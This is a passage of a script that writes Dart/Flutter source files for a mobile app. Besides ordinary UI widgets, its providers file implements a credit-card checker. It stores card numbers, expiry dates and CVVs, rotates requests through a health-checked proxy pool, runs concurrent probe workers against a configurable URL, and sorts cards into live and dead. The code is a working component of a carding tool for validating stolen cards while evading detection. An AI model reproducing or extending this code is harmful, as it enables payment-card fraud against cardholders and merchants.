          }

          class SectionHeader extends StatelessWidget {
            const SectionHeader(this.text, {super.key});
            final String text;

            @override
            Widget build(BuildContext context) => Padding(
              padding: const EdgeInsets.fromLTRB(4, 18, 4, 10),
              child: Text(text.toUpperCase(),
                  style: const TextStyle(fontSize: 11, letterSpacing: 1.4, color: AppColors.textLo, fontWeight: FontWeight.w700)),
            );
          }

          class StatTile extends StatelessWidget {
            const StatTile({super.key, required this.label, required this.value, required this.color});
            final String label;
            final String value;
            final Color color;

            @override
            Widget build(BuildContext context) => Expanded(
              child: GlassPanel(
                padding: const EdgeInsets.symmetric(vertical: 14, horizontal: 10),
                child: Column(children: [
                  Text(value, style: TextStyle(fontSize: 20, fontWeight: FontWeight.w700, color: color)),
                  const SizedBox(height: 4),
                  Text(label, style: AppTextStyles.caption),
                ]),
              ),
            );
          }

          class SegmentedProgress extends StatelessWidget {
            const SegmentedProgress({super.key, required this.value, this.segments = 24, this.color = AppColors.lime});
            final double value;
            final int segments;
            final Color color;

            @override
            Widget build(BuildContext context) {
              final on = (value.clamp(0, 1) * segments).round();
              return Row(
                children: List.generate(segments, (i) {
                  return Expanded(
                    child: Container(
                      height: 5,
                      margin: const EdgeInsets.symmetric(horizontal: 1),
                      decoration: BoxDecoration(
                        color: i < on ? color : AppColors.glassStroke,
                        borderRadius: BorderRadius.circular(3),
                      ),
                    ),
                  );
                }),
              );
            }
          }
          DART

          cat > lib/providers.dart <<'DART'
          import 'package:flutter_riverpod/flutter_riverpod.dart';
          import 'package:shared_preferences/shared_preferences.dart';
          import 'checker.dart';
          import 'models.dart';
          import 'repos.dart';

          final lockProvider = StateProvider<bool>((ref) => true);
          final statsProvider = StateProvider<CheckStats>((ref) => CheckStats());
          final settingsProvider = StateNotifierProvider<SettingsNotifier, AppSettings>((ref) => SettingsNotifier());

          class SettingsNotifier extends StateNotifier<AppSettings> {
            SettingsNotifier() : super(AppSettings()) {
              _load();
            }

            Future<void> _load() async {
              final p = await SharedPreferences.getInstance();
              state = state.copyWith(
                concurrency: p.getInt('conc') ?? 4,
                timeoutSec: p.getInt('to') ?? 15,
                probeUrl: p.getString('probe') ?? state.probeUrl,
                autoLockMin: p.getInt('lock') ?? 5,
                biometrics: p.getBool('bio') ?? false,
              );
            }

            Future<void> setConcurrency(int v) async {
              state = state.copyWith(concurrency: v);
              (await SharedPreferences.getInstance()).setInt('conc', v);
            }

            Future<void> setTimeout(int v) async {
              state = state.copyWith(timeoutSec: v);
              (await SharedPreferences.getInstance()).setInt('to', v);
            }

            Future<void> setProbeUrl(String v) async {
              state = state.copyWith(probeUrl: v);
              (await SharedPreferences.getInstance()).setString('probe', v);
            }

            Future<void> setAutoLock(int v) async {
              state = state.copyWith(autoLockMin: v);
              (await SharedPreferences.getInstance()).setInt('lock', v);
            }

            Future<void> setBiometrics(bool v) async {
              state = state.copyWith(biometrics: v);
              (await SharedPreferences.getInstance()).setBool('bio', v);
            }
          }

          final cardsProvider = StateNotifierProvider<CardsNotifier, List<CreditCard>>((ref) => CardsNotifier());

          class CardsNotifier extends StateNotifier<List<CreditCard>> {
            CardsNotifier() : super(const []) {
              reload();
            }

            void reload() => state = CardRepo.i.all();

            Future<int> addAll(List<CreditCard> cards) async {
              final n = await CardRepo.i.addAll(cards);
              reload();
              return n;
            }

            Future<void> setStatus(String id, CheckStatus s) async {
              for (final c in state) {
                if (c.id == id) c.status = s;
              }
              state = List.of(state);
            }

            Future<void> persist() => CardRepo.i.persist(state);

            Future<void> clear() async {
              await CardRepo.i.clear();
              reload();
            }
          }

          final proxiesProvider = StateNotifierProvider<ProxiesNotifier, List<ProxyNode>>((ref) => ProxiesNotifier());

          class ProxiesNotifier extends StateNotifier<List<ProxyNode>> {
            ProxiesNotifier() : super(const []) {
              reload();
            }

            void reload() => state = ProxyRepo.i.all();

            Future<void> upsert(ProxyNode n) async {
              await ProxyRepo.i.upsert(n);
              reload();
            }

            Future<void> remove(String id) async {
              await ProxyRepo.i.remove(id);
              reload();
            }

            Future<void> setHealth(String id, ProxyHealth h, int ms) async {
              for (final p in state) {
                if (p.id == id) {
                  p.health = h;
                  p.latencyMs = ms;
                }
              }
              state = List.of(state);
              await ProxyRepo.i.persist(state);
            }
          }

          class MissionState {
            MissionState({this.running = false, this.note = '', this.progress = 0, this.kind = ''});
            final bool running;
            final String note;
            final double progress;
            final String kind;
            MissionState copyWith({bool? running, String? note, double? progress, String? kind}) => MissionState(
              running: running ?? this.running,
              note: note ?? this.note,
              progress: progress ?? this.progress,
              kind: kind ?? this.kind,
            );
          }

          final missionProvider = StateNotifierProvider<MissionNotifier, MissionState>((ref) => MissionNotifier(ref));

          class MissionNotifier extends StateNotifier<MissionState> {
            MissionNotifier(this.ref) : super(MissionState());
            final Ref ref;
            bool _cancel = false;

            Future<void> run() async {
              if (state.running) return;
              _cancel = false;
              final cards = ref.read(cardsProvider);
              final proxies = ref.read(proxiesProvider).where((p) => p.health != ProxyHealth.down).toList();
              final cfg = ref.read(settingsProvider);
              final engine = CheckEngine(cfg);
              final lanes = cfg.concurrency.clamp(1, 16);
              ref.read(statsProvider.notifier).state = CheckStats();
              state = MissionState(running: true, kind: 'chequeo', note: '0/${cards.length}');
              var done = 0;
              var cursor = 0;

              Future<void> worker() async {
                while (!_cancel) {
                  final idx = cursor;
                  if (idx >= cards.length) return;
                  cursor++;
                  final card = cards[idx];
                  final p = proxies.isEmpty ? null : proxies[idx % proxies.length];
                  final out = await engine.probe(p, pan: card.pan, mm: card.expMonth, yy: card.expYear, cvv: card.cvv);
                  done++;
                  final st = ref.read(statsProvider);
                  ref.read(statsProvider.notifier).state = st.copyWith(
                    done: st.done + 1,
                    live: st.live + (out.ok ? 1 : 0),
                    dead: st.dead + (out.ok || out.error ? 0 : 1),
                    errors: st.errors + (out.error ? 1 : 0),
                  );
                  final ns = out.error
                      ? CheckStatus.unknown
                      : (out.ok ? CheckStatus.live : CheckStatus.dead);
                  await ref.read(cardsProvider.notifier).setStatus(card.id, ns);
                  state = state.copyWith(progress: cards.isEmpty ? 0 : done / cards.length, note: '$done/${cards.length}');
                }
              }

              await Future.wait(List.generate(lanes, (_) => worker()));
              await ref.read(cardsProvider.notifier).persist();
              state = MissionState(kind: 'chequeo', note: 'listo', progress: 1);
            }

            void stop() => _cancel = true;
          }
